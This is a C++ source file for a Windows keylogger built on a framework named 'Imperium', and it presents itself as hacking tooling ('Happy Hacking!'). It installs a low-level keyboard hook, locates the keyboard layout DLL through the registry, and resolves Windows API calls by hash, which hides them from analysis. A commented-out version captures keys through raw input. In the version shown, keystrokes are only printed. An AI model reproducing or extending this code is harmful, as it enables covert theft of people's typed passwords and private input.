#include <Imperium.h>
#include <Keylogger.h>

/*!
 * @brief
 *  main function put your code here
 *
 * @param Param
 *  parameters
 */
FUNC VOID Main() {
    //
    // call LoadLibraryA to have the needed module is our peb
    // wont be able to resolve their functions otherwise
    //
    if ( ! Imperium::win32::call< fnLoadLibraryA >( H_FUNC( "kernel32!LoadLibraryA" ), "user32.dll" ) ||
         ! Imperium::win32::call< fnLoadLibraryA >( H_FUNC( "kernel32!LoadLibraryA" ), "advapi32.dll" )
    ) {
        return;
    }

    PRINTF_INFO( "Starting the keylogger..." );
    Keylogger::start();
    Imperium::win32::call< fnMessageBoxA >( H_FUNC( "user32!MessageBoxA" ), NULL, "Happy Hacking!", "Imperium", MB_OK );
}

/*!
 * @brief
 *  Callback to receive keystrokes
 *
 */
/*
FUNC LRESULT CALLBACK wndproc(
    HWND   Window,
    ULONG  Message,
    WPARAM wParam,
    LPARAM lParam
) {
    BUFFER< PRAWINPUT > Input    = { 0 };
    PRAWKEYBOARD        Keyboard = { 0 };

    //
    // ignore message that are not input keys
    //
    if ( Message != WM_INPUT ) {
        return FALSE;
    }

    //
    // get the size of the input data
    //
    Imperium::win32::call< fnGetRawInputData >(
        H_FUNC( "user32!GetRawInputData" ),
        lParam, RID_INPUT, nullptr, &Input.Size, sizeof( RAWINPUTHEADER )
    );

    //
    // allocate memory for the input data
    //
    if ( ! ( Input.Buffer = Imperium::mem::alloc( Input.Size ) ) ) {
        return FALSE;
    }

    //
    // get the input data
    //
    if ( ! Imperium::win32::call< fnGetRawInputData >(
        H_FUNC( "user32!GetRawInputData" ),
        lParam, RID_INPUT, nullptr, &Input.Size, sizeof( RAWINPUTHEADER )
    ) ) {
        //
        // check its a keyboard
        //
        if ( Input.Buffer->header.dwType == RIM_TYPEKEYBOARD ) {
            PRINTF_INFO( "There was an input" );

            //
            // process the event
            //
            Keyboard = &Input.Buffer->data.keyboard;

            process_kbd_event( Keyboard->MakeCode, Keyboard->Flags & RI_KEY_E0, Keyboard->Flags & RI_KEY_E1,
                               Keyboard->Flags & RI_KEY_BREAK, Keyboard->VKey );
        }
    }

    return Imperium::win32::call< fnDefWindowProcA >(
        H_FUNC( "user32!DefWindowProcA" ),
        Window, Message, wParam, lParam
    );
}
*/

namespace Keylogger {
    /*!
     * @brief
     *  start logging keystrokes
     *
     * @return
     */
    FUNC VOID start() {
        MSG        Msg    = { 0 };
        HHOOK      Hook   = { 0 };
        PKBDTABLES Table  = { 0 };
        PSTR       KbLang = { 0 };

        //
        // get the language struct
        //
        if ( ! ( Table = get_kbdtables( &KbLang ) ) ) {
            goto END;
        }

        PRINTF_INFO( "=> Table: 0x%08X", Table );
        PRINTF_INFO( "=> Language: %s", KbLang );

        //
        // set the window hook to capture keystrokes
        //
        if ( ! ( Hook = Imperium::win32::call< fnSetWindowsHookExA >(
                     H_FUNC( "user32!SetWindowsHookExA" ),
                     WH_KEYBOARD_LL, callback, NULL, 0 )
        ) ) {
            PRINT_WIN32_ERROR( "SetWindowsHookExA" );
            goto END;
        }

        //
        // get keystrokes
        //
        while ( Imperium::win32::call< fnGetMessageA >(
            H_FUNC( "user32!GetMessageA" ),
            &Msg, NULL, 0, 0
        ) ) {
            //Imperium::win32::call< fnTranslateMessage >( H_FUNC( "user32!TranslateMessage" ), &Msg );
            //Imperium::win32::call< fnDispatchMessage >( H_FUNC( "user32!DispatchMessage" ), &Msg );
        }

    END:
        //
        // clean
        //
        if ( Hook ) Imperium::win32::call< fnUnhookWindowsHookEx >( H_FUNC( "user32!UnhookWindowsHookEx" ), Hook );
        if ( KbLang ) Imperium::mem::free( KbLang );
    }

    /*!
     * @brief
     *  get a pointer onto the KBDTABLE of the language
     *
     * @param KbLang
     *  language of the keyboard
     *
     * @return
     *  pointer to language structure
     */
    FUNC PKBDTABLES get_kbdtables(
        OUT OPTIONAL PSTR *KbLang
    ) {
        PSTR        Dll           = { 0 };
        ULONG       DllSize       = { 0 };
        HKEY        RegKey        = { 0 };
        CHAR        RegPath[ 59 ] = "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\";
        PKBDTABLES  Table         = { 0 };
        SYMBOL_HASH SymHash       = { 0 };
        ULONG       LangSize      = { 0 };

        //
        // get the keyboard layout
        //
        Imperium::win32::call< fnGetKeyboardLayoutNameA >(
            H_FUNC( "user32!GetKeyboardLayoutNameA" ),
            RegPath + 50
        );

        //
        // open the registry key
        //
        if ( ! SUCCESS( Imperium::win32::call< fnRegOpenKeyExA >(
            H_FUNC( "advapi32!RegOpenKeyExA" ),
            HKEY_LOCAL_MACHINE, RegPath, 0, KEY_READ, &RegKey
        ) ) ) {
            PRINT_WIN32_ERROR( "RegOpenKeyExA" );
            goto END;
        }

        //
        // get the keyboard language
        //
        if ( KbLang ) {
            //
            // get the size first
            //
            Imperium::win32::call< fnRegQueryValueExA >(
                H_FUNC( "advapi32!RegQueryValueExA" ),
                RegKey, "Layout Text", nullptr, nullptr, Dll, &LangSize
            );

            *KbLang = Imperium::mem::alloc( LangSize );

            if ( ! SUCCESS( Imperium::win32::call< fnRegQueryValueExA >(
                H_FUNC( "advapi32!RegQueryValueExA" ),
                RegKey, "Layout Text", nullptr, nullptr, *KbLang, &LangSize
            ) ) ) {
                PRINT_WIN32_ERROR( "RegQueryValueExA" );
                goto END;
            }
        }

        //
        // get the DLL associated with the keyboard layout
        // get the size first
        //
        Imperium::win32::call< fnRegQueryValueExA >(
            H_FUNC( "advapi32!RegQueryValueExA" ),
            RegKey, "Layout File", nullptr, nullptr, Dll, &DllSize
        );

        Dll = Imperium::mem::alloc( DllSize );

        if ( ! SUCCESS( Imperium::win32::call< fnRegQueryValueExA >(
            H_FUNC( "advapi32!RegQueryValueExA" ),
            RegKey, "Layout File", nullptr, nullptr, Dll, &DllSize
        ) ) ) {
            PRINT_WIN32_ERROR( "RegQueryValueExA" );
            goto END;
        }

        //
        // load the dll in the peb
        // so that win32::call can find it
        //
        if ( ! Imperium::win32::call< fnLoadLibraryA >( H_FUNC( "kernel32!LoadLibraryA" ), Dll ) ) {
            PRINT_WIN32_ERROR( "LoadLibraryA" );
            goto END;
        }

        //
        // get the structure
        //
        SymHash.Function = H_STR( "KbdLayerDescriptor" );
        SymHash.Module   = Imperium::crypto::hash_string( Dll, DllSize );
        if ( ! ( Table = Imperium::win32::call< fnKbdLayerDescriptor >( SymHash ) ) ) {
            goto END;
        }

        PRINTF_INFO( "=> Keyboard DLL: %s", Dll );

    END:
        //
        // cleanup
        //
        if ( Dll ) Imperium::mem::free( Dll );
        if ( RegKey ) Imperium::win32::call< fnRegCloseKey >( H_FUNC( "advapi32!RegCloseKey" ), RegKey );
        return Table;
    }

    /*!
     * @brief
     *  the callback function when a keystroke is hit
     */
    FUNC INT64 CALLBACK callback(
        ULONG            Code,
        PVOID            Param,
        PKBDLLHOOKSTRUCT DllHook
    ) {
        process_kbd_event( DllHook->scanCode,
                           DllHook->flags & LLKHF_EXTENDED,
                           0,
                           DllHook->flags & LLKHF_UP,
                           DllHook->vkCode
        );

        //
        // forward the execution to the next hook
        //
        return Imperium::win32::call< fnCallNextHookEx >( H_FUNC( "user32!CallNextHookEx" ), NULL, Code, Param, DllHook );
    }

    /*!
     * @brief
     *  process keystrokes
     *
     * @param sc
     *  virtual scan code
     *
     * @param e0
     *  is the E0 extended flag set,
     *
     * @param e1
     *  is the E1 extended flag set?
     *
     * @param keyup
     *  is the event a key press(0) of a release (1)
     *
     * @param vk
     *  virtual key associated to the key event
     */
    FUNC VOID process_kbd_event(
        BYTE sc,
        BOOL e0,
        BOOL e1,
        BOOL keyup,
        BYTE vk
    ) {
        PRINTF_INFO( "Key with scan code '%u' was pressed %d!", sc );
    }

    /*
    FUNC BOOL start() {
        HWND           Wnd        = { 0 };
        MSG            Message    = { 0 };
        RAWINPUTDEVICE Device     = { 0 };
        WNDCLASSEX     WndClass   = { 0 };
        HANDLE         File       = { 0 };
        BOOL           ExitStatus = { 0 };
        USHORT         Atom       = { 0 };
        PVOID          AtomCast   = { 0 };

        //
        // handle onto our image
        // todo: look if GetModuleHandleA(NULL) if the same as calling NtCreateFile on our process image
        // if so use NtCreateFile instead
        //
        if ( ! ( File = Imperium::win32::call< fnGetModuleHandleA >( H_FUNC( "kernel32!GetModuleHandleA" ), NULL ) ) ) {
            PRINT_WIN32_ERROR( "GetModuleHandleA" );
            goto END;
        }

        //
        // setup a window class which is required to receive RAWINPUT events
        //
        WndClass.cbSize        = sizeof( WNDCLASSEX );
        WndClass.lpfnWndProc   = wndproc;
        WndClass.hInstance     = File;
        WndClass.lpszClassName = "rawkbd_wndclass";

        //
        // register class
        //
        if ( ! ( Atom = Imperium::win32::call< fnRegisterClassExA >( H_FUNC( "user32!RegisterClassExA" ), &WndClass ) ) ) {
            PRINT_WIN32_ERROR( "RegisterClassExA" );
            return FALSE;
        }

        PRINTF_INFO( "Got atom: 0x%X", Atom );

        AtomCast = ( PVOID ) Atom;

        //
        // create window
        // fails with GetLastError() = 0, much love MS <3
        //
        if ( ! ( Wnd = Imperium::win32::call< fnCreateWindowExA >(
                     H_FUNC( "user32!CreateWindowExA" ),
                     0, AtomCast, nullptr, 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, File, nullptr )
        ) ) {
            PRINT_WIN32_ERROR( "CreateWindowExA" );
            goto END;
        }

        //
        // setup the device
        //
        Device.usUsagePage = 0x01; // generic
        Device.usUsage     = 0x06; // keyboard
        Device.dwFlags     = RIDEV_INPUTSINK;
        Device.hwndTarget  = Wnd;

        //
        // register the device
        //
        if ( ! Imperium::win32::call< fnRegisterRawInputDevices >(
            H_FUNC( "user32!RegisterRawInputDevices" ),
            &Device, 1, sizeof( RAWINPUTDEVICE )
        ) ) {
            PRINT_WIN32_ERROR( "RegisterRawInputDevices" );
            goto END;
        }

        //
        // get keystrokes
        //
        while ( Imperium::win32::call< fnGetMessageA >( H_FUNC( "user32!GetMessageA" ), &Message, NULL, 0, 0 ) ) {
            Imperium::win32::call< fnTranslateMessage >( H_FUNC( "user32!TranslateMessage" ), &Message );
            Imperium::win32::call< fnDispatchMessage >( H_FUNC( "user32!DispatchMessage" ), &Message );
        }

        ExitStatus = TRUE;

    END:
        //
        // cleanup
        //
        Imperium::win32::call< fnUnregisterClassA >( H_FUNC( "user32!UnregisterClassA" ), WndClass.lpszClassName, NULL );

        if ( Wnd ) Imperium::win32::call< fnDestroyWindow >( H_FUNC( "user32!DestroyWindow" ), Wnd );
        return ExitStatus;
    }
    */
}
